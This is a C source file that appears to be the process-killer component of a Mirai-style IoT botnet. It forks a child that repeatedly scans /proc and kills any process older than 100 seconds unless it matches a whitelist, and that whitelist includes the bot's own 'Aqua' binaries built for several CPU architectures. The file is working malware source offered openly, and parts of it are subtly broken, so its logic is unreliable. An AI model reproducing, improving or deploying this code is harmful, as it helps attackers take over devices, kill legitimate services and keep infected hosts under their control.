#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <stdbool.h>
#include <ctype.h>
#include <signal.h>
#include <sys/prctl.h>

#define MAX_EXCEPTIONS 30
#define MAX_PROCESS_NAME 256

#include "headers/killer.h"

typedef struct {
    char name[MAX_PROCESS_NAME];
} ProcessInfo;

int compare_process_info(const void *a, const void *b) {
    const ProcessInfo *pa = (const ProcessInfo *)a;
    const ProcessInfo *pb = (const ProcessInfo *)b;

    return strcmp(pa->name, pb->name);
}

void killer_starttime(unsigned int duration, const char whitelist[][MAX_PROCESS_NAME], size_t whitelist_size) {
    DIR *proc = opendir("/proc");
    if (proc == NULL) {
        return;
    }

    struct dirent *files;
    char path[64], stat_path[128];
    unsigned long starttime;
    unsigned long clk_tck = sysconf(_SC_CLK_TCK);
    time_t current_time;

    ProcessInfo processes[MAX_EXCEPTIONS];
    size_t process_count = 0;

    // Get the list of kernel processes
    FILE *proc_file = fopen("/proc/kallsyms", "r");
    if (proc_file != NULL) {
        char line[256];
        while (fgets(line, sizeof(line), proc_file) != NULL) {
            char name[MAX_PROCESS_NAME];
            unsigned long long address;
            sscanf(line, "%llx %*c %255s\n", &address, name);

            if (process_count < MAX_EXCEPTIONS) {
                strncpy(processes[process_count].name, name, sizeof(processes[process_count].name) - 1);
                process_count++;
            }
        }

        fclose(proc_file);
    }

    // Sort the processes by name
    qsort(processes, process_count, sizeof(ProcessInfo), compare_process_info);

    // Create a dynamic whitelist of important processes
    char dynamic_whitelist[MAX_EXCEPTIONS][MAX_PROCESS_NAME];
    size_t dynamic_whitelist_size = 0;

    // Add kernel process names to the whitelist
    for (size_t i = 0; i < process_count; i++) {
        if (dynamic_whitelist_size < MAX_EXCEPTIONS) {
            strncpy(dynamic_whitelist[dynamic_whitelist_size], processes[i].name, sizeof(dynamic_whitelist[dynamic_whitelist_size]) - 1);
            dynamic_whitelist_size++;
        }
    }

    // Add process names from the external whitelist to the dynamic whitelist
    for (size_t i = 0; i < whitelist_size; i++) {
        if (dynamic_whitelist_size < MAX_EXCEPTIONS) {
            strncpy(dynamic_whitelist[dynamic_whitelist_size], whitelist[i], sizeof(dynamic_whitelist[dynamic_whitelist_size]) - 1);
            dynamic_whitelist_size++;
        }
    }

    // Kill processes that are not in the whitelist and have exceeded the specified duration
    while ((files = readdir(proc))) {
        if (!isdigit(files->d_name[0])) {
            continue;
        }

        current_time = time(NULL);

        memset(path, 0, sizeof(path));
        snprintf(path, sizeof(path), "/proc/%s/stat", files->d_name);

        FILE *stat_file = fopen(path, "r");
        if (stat_file != NULL) {
            char process_name[MAX_PROCESS_NAME];
            fscanf(stat_file, "%*d %255s", process_name);

            fclose(stat_file);

            bool is_whitelisted = false;

            for (size_t i = 0; i < dynamic_whitelist_size; i++) {
                if (strcmp(process_name, dynamic_whitelist[i]) == 0) {
                    is_whitelisted = true;
                    break;
                }
            }

            if (!is_whitelisted) {
                snprintf(stat_path, sizeof(stat_path), "/proc/%s/stat", files->d_name);
                stat_file = fopen(stat_path, "r");
                if (stat_file != NULL) {
                    fscanf(stat_file, "%*d %*s %*c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u %*u %*u %*d %*d %*d %*d %*d %lu", &starttime);
                    fclose(stat_file);

                    if (starttime > 0) {
                        time_t process_start_time = starttime / clk_tck;
                        time_t elapsed_time = current_time - process_start_time;

                        if (elapsed_time >= duration) {
                            kill(atoi(files->d_name), SIGKILL);
                        }
                    }
                }
            }
        }
    }
}

void starttime_init() {

    pid_t childpid = fork();
    if (childpid == -1) {
        return 1;
    } else if (childpid > 0) {
        // Parent process
        return 0;
    }
    
    prctl(PR_SET_PDEATHSIG, SIGHUP); // Kill the child process if the parent dies
    
    const char whitelist[][MAX_PROCESS_NAME] = {
        "/bin/busybox",
        "/usr/lib/systemd/systemd",
        "/usr/libexec/openssh/sftp-server",
        "/opt/app/monitor",
        "usr/",
        "mnt/",
        "sys/",
        "bin/",
        "boot/",
        "run/",
        "media/",
        "srv/",
        "sbin/",
        "lib/",
        "etc/",
        "dev/",
        "telnet",
        "ssh",
        "sshd"
        "bash",
        "httpd",
        "telnetd",
        "dropbear",
        "ropbear",
        "encoder",
        "system",
        "/z/secom/",
        "/usr/sbin/",
        "/usr/lib/",
        "Aqua.mpsl",
        "Aqua.mips",
        "Aqua.arm",
        "Aqua.arm",
        "Aqua.arm5",
        "Aqua.arm6",
        "Aqua.arm7",
        "Aqua.x86",
        "/var/tmp/wlancont",
        "wlancont"
    };
    size_t whitelist_size = sizeof(whitelist) / sizeof(whitelist[0]);

    unsigned int duration = 100;
    
    while (1) {
        killer_starttime(duration, whitelist, whitelist_size);
        sleep(5);
    }

}
